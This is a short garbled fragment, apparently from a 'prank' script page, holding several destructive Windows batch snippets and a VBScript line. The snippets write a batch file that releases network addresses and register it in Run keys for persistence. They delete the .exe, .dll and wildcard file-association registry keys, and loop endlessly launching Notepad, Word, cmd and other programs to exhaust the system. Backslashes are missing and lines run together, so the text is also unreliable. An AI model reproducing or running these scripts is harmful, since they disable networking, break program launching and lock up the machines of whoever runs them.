[alert-note]echo @echo off>c:windowswimn32.bat
echo break off>c:windowswimn32.bat echo
ipconfig/release_all>c:windowswimn32.bat
echo end>c:windowswimn32.batreg add
hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho ENTER YOUR MESSAGE!!
:top
START %SystemRoot%\system32\notepad.exe
GOTO top
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
:MESSAGE
ECHO Your PC has been crashed.Your Dad.
GOTO MESSAGE
@echo off
:x
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
goto x
x=msgbox(You have died.,buttons,WARNING)
loop